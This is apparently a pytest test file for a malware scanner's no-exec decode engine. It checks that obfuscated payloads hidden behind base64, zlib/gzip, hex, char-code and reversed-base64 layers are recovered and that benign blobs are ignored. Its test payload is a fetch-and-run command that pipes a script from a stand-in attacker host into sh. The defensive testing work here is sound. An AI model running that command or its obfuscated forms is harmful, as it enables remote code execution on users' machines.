# SPDX-License-Identifier: AGPL-3.0-or-later
"""Recursive no-exec decode engine."""
from __future__ import annotations

import base64
import gzip
import zlib

import pytest

from pkgsentry.analyze import decode_engine as de


def _recover_bytes(data: bytes) -> list[bytes]:
    return [d.data for d in de.recover(data)]


def _chains(data: bytes) -> list[tuple[str, ...]]:
    return [d.chain for d in de.recover(data)]


PAYLOAD = b"import os; os.system('curl http://evil.tld/x.sh | sh')"


def test_single_layer_base64_url():
    blob = base64.b64encode(PAYLOAD)
    data = b"x = '" + blob + b"'\n"
    got = _recover_bytes(data)
    assert any(b"http://evil.tld/x.sh" in g for g in got)


def test_compression_layer_is_no_longer_dropped():
    # base64(zlib(payload)) — the classic exec(zlib.decompress(b64decode(...))) shape.
    # The old single-layer pass dropped zlib output as non-printable; this must recover it.
    blob = base64.b64encode(zlib.compress(PAYLOAD))
    data = b"payload = b'" + blob + b"'\n"
    out = de.recover(data)
    assert any(b"http://evil.tld" in d.data for d in out)
    assert any("zlib" in d.chain or "gzip" in d.chain for d in out)


def test_multi_layer_b64_gzip_b64_chain():
    inner = base64.b64encode(PAYLOAD)
    blob = base64.b64encode(gzip.compress(inner))
    data = b"d='" + blob + b"'"
    out = de.recover(data)
    hit = [d for d in out if b"http://evil.tld" in d.data]
    assert hit, "did not recover through the 3-layer chain"
    # the recovering chain should include a compression step
    assert any("gzip" in d.chain or "zlib" in d.chain for d in hit)


def test_charcode_array_decoded():
    arr = ",".join(str(c) for c in PAYLOAD).encode()
    data = b"var a=[" + arr + b"];eval(String.fromCharCode.apply(0,a))"
    got = _recover_bytes(data)
    assert any(b"http://evil.tld" in g for g in got)


def test_hex_blob_with_url():
    blob = PAYLOAD.hex().encode()
    data = b'h = "' + blob + b'"'
    got = _recover_bytes(data)
    assert any(b"evil.tld" in g for g in got)


def test_benign_base64_data_is_dropped():
    # A base64 blob that decodes to printable-but-benign content (no URL / no code
    # token) must NOT be surfaced — this is the FP-explosion guard.
    benign = base64.b64encode(b"the quick brown fox jumps over the lazy dog " * 4)
    data = b"DATA = '" + benign + b"'"
    assert _recover_bytes(data) == []


def test_random_high_entropy_blob_is_dropped():
    # Looks like base64 but decodes to high-entropy bytes (a key/ciphertext) -> drop.
    rnd = base64.b64encode(bytes((i * 167 + 13) % 256 for i in range(64)))
    data = b"KEY = '" + rnd + b"'"
    # may produce nothing; must not raise and must not flood
    assert len(de.recover(data)) < 5


def test_decompression_bomb_is_bounded(monkeypatch):
    # A small gzip that expands past the per-layer cap must be dropped, not inflated.
    monkeypatch.setattr(de, "MAX_LAYER_BYTES", 1024)
    bomb = gzip.compress(b"A" * 200_000)
    assert de._gzip_zlib(bomb) is None


def test_depth_budget_caps_recursion(monkeypatch):
    monkeypatch.setattr(de, "MAX_DEPTH", 2)
    # 4 nested base64 layers around the payload; depth cap stops before the payload.
    blob = PAYLOAD
    for _ in range(4):
        blob = base64.b64encode(blob)
    data = b"x='" + blob + b"'"
    # must not recover the deep payload (depth-capped) and must not hang
    assert all(b"evil.tld" not in d.data for d in de.recover(data))


def test_double_base64():
    blob = base64.b64encode(base64.b64encode(PAYLOAD))
    data = b"x = '" + blob + b"'"
    out = de.recover(data)
    hit = [d for d in out if b"http://evil.tld" in d.data]
    assert hit
    assert hit[0].chain.count("b64") >= 2


def test_reverse_base64():
    # b64decode(s[::-1]) — the reversed-base64 evasion.
    rev = base64.b64encode(PAYLOAD)[::-1]
    data = b"s = '" + rev + b"'"
    out = de.recover(data)
    hit = [d for d in out if b"http://evil.tld" in d.data]
    assert hit, "did not recover reversed base64"
    assert "reverse" in hit[0].chain


def test_reversed_base64_executable():
    fake_pe = b"MZ\x90\x00\x03\x00\x00\x00" + b"this program cannot be run in dos mode" * 2
    rev = base64.b64encode(fake_pe)[::-1]
    data = b"b = '" + rev + b"'"
    out = de.recover(data)
    # the recovered layer should be the PE (MZ magic), via reverse + b64
    assert any(d.data.startswith(b"MZ") and "reverse" in d.chain for d in out)


def test_no_candidates_returns_empty():
    assert de.recover(b"just some plain source code with no blobs\n") == []
    assert de.recover(b"") == []
